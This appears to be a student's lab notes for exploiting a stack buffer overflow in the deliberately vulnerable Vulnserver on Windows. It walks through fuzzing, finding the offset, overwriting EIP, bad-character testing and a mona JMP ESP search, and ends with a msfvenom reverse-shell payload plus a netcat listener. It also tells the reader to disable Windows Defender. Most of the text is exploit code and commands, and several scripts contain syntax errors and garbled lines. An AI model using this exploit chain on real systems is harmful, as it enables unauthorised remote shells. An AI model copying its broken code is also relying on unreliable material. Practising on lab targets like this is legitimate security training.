-------------------------------------------------------------REQUIRED INSTALLATIONS----------------------------------------------
Victim machine - windows

1.Windows 10 pro
2.In victim machine , install vulnserver - the grey corner (download)
3.Immunity debugger (Download and install)

-----------------------------------------------------------BUFFER OVERFLOWS EXPLAINED--------------------------------------------------

1111 kERNAL
     STACK---------------------------------ANATOMY OF THE STACK
     HEAP                                 ESP (EXTENDED STACK POINTER)                       TOP
     DATA                                 
0000 TEXT                                       BUFFER SPACE

                                          EBP (EXTENDED BASE POINTER)                       BOTTOM
                                          EIP(EXTENDED INSTRUCTION POINTER)/RETURN ADDRESS
                                          
      This buffer space fills up with character , the buffer space is going to download 
      sometimes it overflow the buffer space.
      Attacker have the control to the stack and the pointer , eventually you have a reverse shell including root.
      
      Steps to conduct a buffer overflow:
      1.spiking
      2.fuzzing
      3.finding the offset
      4.overwriting the EIP
      5.Finding Bad Character
      6.Finding the Right Module
      7.Generating shellcode
      8.root
      
 ---------------------------------------------------------------SPIKING----------------------------------------------------
 
*first disable windows defender
*run vulnserver with admin access
*open immunity debugger , click attach ,choose vulnserver , click start

Attacker machine:
$nc -nv 192.168.1.90 9999
$HELP
$EXIT
9999 - default port

$generic_send_tcp
$gedit stats.spk

in the file type the below commands
s_readline()
s_string("STATS ");
s_string_variable("0");

$generic_send_tcp 192.168.1.90 9999 stats.spk 0 0

$gedit trun.spk 

in the file type the below commands
s_readline()
s_string("TURN ");
s_string_variable("0");

$generic_send_tcp 192.168.1.90 9999 TURN.spk 0 0

----------------------------------------------------------FUZZING-----------------------------------------------------------
*restart immunity debugger and attach the vulnserver

$gedit 1.py

program in the file:
==========================================================================
import sys,socket
from time import sleep

buffer ="A" =100
while True:
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           
           s.send(('TRUN /.:/' +buffer))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Fuzzing crashed at %s bytes" % str(len(buffer))
            sys.exit()
==============================================================================

$chmod =x 1.py
$./1.py

---------------------------------------------------------------FINDING THE OFFSET--------------------------------------------

TOOL FOR OVERWRITE THE IP.
(PATTERN CREATE)

$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

copy the output

==========================================================================     
 import sys,socket

offset = "paste the value "
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           s.send(('TRUN /.:/' +buffer))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Error connecting to server"
            sys.exit()                                         
 ========================================================================
 
 $gedit 2.py
 $chmod +X 2.py
 
 we will get the value on EIP , will get the offset.
 
 $./2.py
 
 EIP = 386F4337
$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337

FOUND EXACT MATCH AT OFFSET 2003.

---------------------------------------------------------------OVERWRITING THE EIP------------------------------------------------------
offset - 2003

modify 2,py

==========================================================================     
 import sys,socket

shellcode = "A" * 2003 + "B" * 4
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           s.send(('TRUN /.:/' +shellcode))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Error connecting to server"
            sys.exit()             
==========================================================================  

$./2.py

------------------------------------------------------------------FINDING THE BAD CHARACTERS---------------------------------------
TOOL - BADCHARS

$gedit 2.py

=======================================================================
import sys,socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
shellcode = "A" * 2003 + "B" * 4 + badchars
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           s.send(('TRUN /.:/' +shellcode))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Error connecting to server"
            sys.exit() 
==============================================================================================

identifying the bad characters.
EXAMPLE FOR THE BAD CHARACTERS.

----------------------------------------------------FINDING THE RIGHT MODULE-----------------------------------------

MONO MODULE - github.com/corelan/mona

copy and paste the mona.py in the immunity debugger(pycommands folder)

type in  immunity debugger (!mona modules)

$locate nasm_shell
$/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > JMP ESP 

type in  immunity debugger (!mona find -s "\xff\xe4" -m essfunc.dll)

search the result number 

nasm > exit

$gedit 2.py

=========================================================================
 import sys,socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           s.send(('TRUN /.:/' +shellcode))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Error connecting to server"
            sys.exit()   
            
=======================================================================

 625011AF FFE4 JMP ESP
 
 We are overwriting the IP in the exact spot we need to.
 
 $./2.py
 
 you can see the breakpoint , we are controlling the system.
 
 ---------------------------------------------------------GENERATING SHELLCODE AND GAINING ROOT ACCESS--------------------------------------------------
 
 $msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.131 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

COPY THE OUTPUT
==============================================================================
 import sys,socket
 
 OVERFLOW = PASTE THE OUTPUT

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + OVERFLOW
      try:
           s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect(('192.168.1.90',9999))
           s.send(('TRUN /.:/' +shellcode))
           s.close()
           sleep(1)
           buffer = buffer + "A"*100
           
     except:
            print "Error connecting to server"
            sys.exit()  
=================================================================================

$nc -nvlp 4444

$./2.py

got the admin access

-----------------------------------------------------EXPLOIT DEVELOPMENT USING PYTHON3 and MONA------------------------------------ 
update to the course 
python 2 is deprecated

changes in the code

!/usr/bin/python3

s.send((payload.enode()))

print("")

immunity debugger , run vulnmachine . 

!mona config -set workingfolder c:\mona

finding badchars and binary generated
!mona bytearray -cpb "\x00"

!mona compare -f c:\mona\bytearray.bin -a 010AF9C8

POSSIBLE BADCHARACTER

!mona jmp -r ESP -m "essfunc.dll"

-------------------------------------------------------------------------------------------------------------------------



            
